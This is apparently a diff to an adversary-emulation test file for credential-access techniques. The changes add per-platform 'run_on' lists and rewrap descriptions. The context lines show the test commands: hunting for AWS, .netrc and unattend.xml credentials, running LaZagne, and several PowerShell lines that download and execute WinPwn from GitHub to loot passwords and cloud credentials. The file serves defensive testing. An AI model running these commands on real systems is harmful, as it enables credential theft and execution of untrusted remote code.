@@ -17,6 +17,10 @@ atomic_tests:
     command: |
       find #{file_path} -name "credentials" -type f -path "*/.aws/*" 2>/dev/null
     name: sh
+  run_on:
+  - freebsd
+  - macos
+  - linux
 - name: Extract Browser and System credentials with LaZagne
   auto_generated_guid: 9e507bb8-1d30-4e3b-a49b-cb5727d7ea79
   description: |
@@ -28,6 +32,8 @@ atomic_tests:
       python2 laZagne.py all
     elevation_required: true
     name: bash
+  run_on:
+  - macos
 - name: Extract passwords with grep
   auto_generated_guid: bd4cf0d1-7646-474e-8610-78ccf5a097c4
   description: |
@@ -45,6 +51,10 @@ atomic_tests:
       grep -ri password #{file_path}
       exit 0
     name: sh
+  run_on:
+  - freebsd
+  - linux
+  - macos
 - name: Extracting passwords with findstr
   auto_generated_guid: 0e56bf29-ff49-4ea5-9af4-3b81283fd513
   description: |
@@ -56,6 +66,8 @@ atomic_tests:
       findstr /si pass *.xml *.doc *.txt *.xls
       ls -R | select-string -ErrorAction SilentlyContinue -Pattern password
     name: powershell
+  run_on:
+  - windows
 - name: Access unattend.xml
   auto_generated_guid: 367d4004-5fc0-446d-823f-960c74ae52c3
   description: |
@@ -69,7 +81,8 @@ atomic_tests:
       type C:\Windows\Panther\Unattend\unattend.xml
     name: command_prompt
     elevation_required: true
-
+  run_on:
+  - windows
 - name: Find and Access Github Credentials
   auto_generated_guid: da4f751a-020b-40d7-b9ff-d433b7799803
   description: |
@@ -88,9 +101,14 @@ atomic_tests:
     elevation_required: false
     command: |
       for file in $(find #{file_path} -type f -name .netrc 2> /dev/null);do echo $file ; cat $file ; done
+  run_on:
+  - freebsd
+  - linux
+  - macos
 - name: WinPwn - sensitivefiles
   auto_generated_guid: 114dd4e3-8d1c-4ea7-bb8d-8d8f6aca21f0
-  description: Search for sensitive files on this local system using the SensitiveFiles function of WinPwn
+  description: Search for sensitive files on this local system using the SensitiveFiles
+    function of WinPwn
   supported_platforms:
   - windows
   executor:
@@ -99,9 +117,12 @@ atomic_tests:
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       sensitivefiles -noninteractive -consoleoutput
     name: powershell
+  run_on:
+  - windows
 - name: WinPwn - Snaffler
   auto_generated_guid: fdd0c913-714b-4c13-b40f-1824d6c015f2
-  description: Check Domain Network-Shares for cleartext passwords using Snaffler function of WinPwn
+  description: Check Domain Network-Shares for cleartext passwords using Snaffler
+    function of WinPwn
   supported_platforms:
   - windows
   executor:
@@ -110,9 +131,12 @@ atomic_tests:
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       Snaffler -noninteractive -consoleoutput
     name: powershell
+  run_on:
+  - windows
 - name: WinPwn - powershellsensitive
   auto_generated_guid: 75f66e03-37d3-4704-9520-3210efbe33ce
-  description: Check Powershell event logs for credentials or other sensitive information via winpwn powershellsensitive function.
+  description: Check Powershell event logs for credentials or other sensitive information
+    via winpwn powershellsensitive function.
   supported_platforms:
   - windows
   executor:
@@ -121,6 +145,8 @@ atomic_tests:
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       powershellsensitive -consoleoutput -noninteractive
     name: powershell
+  run_on:
+  - windows
 - name: WinPwn - passhunt
   auto_generated_guid: 00e3e3c7-6c3c-455e-bd4b-461c7f0e7797
   description: Search for Passwords on this system using passhunt via WinPwn
@@ -140,6 +166,8 @@ atomic_tests:
       rm -force -recurse .\LocalRecon -ErrorAction Ignore
       rm -force -recurse .\Vulnerabilities -ErrorAction Ignore
     name: powershell
+  run_on:
+  - windows
 - name: WinPwn - SessionGopher
   auto_generated_guid: c9dc9de3-f961-4284-bd2d-f959c9f9fda5
   description: Launches SessionGopher on this system via WinPwn
@@ -151,9 +179,13 @@ atomic_tests:
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       sessionGopher -noninteractive -consoleoutput
     name: powershell
-- name: WinPwn - Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials
+  run_on:
+  - windows
+- name: WinPwn - Loot local Credentials - AWS, Microsoft Azure, and Google Compute
+    credentials
   auto_generated_guid: aaa87b0e-5232-4649-ae5c-f1724a4b2798
-  description: Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials technique via function of WinPwn
+  description: Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials
+    technique via function of WinPwn
   supported_platforms:
   - windows
   executor:
@@ -162,3 +194,5 @@ atomic_tests:
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       SharpCloud -consoleoutput -noninteractive  
     name: powershell
+  run_on:
+  - windows
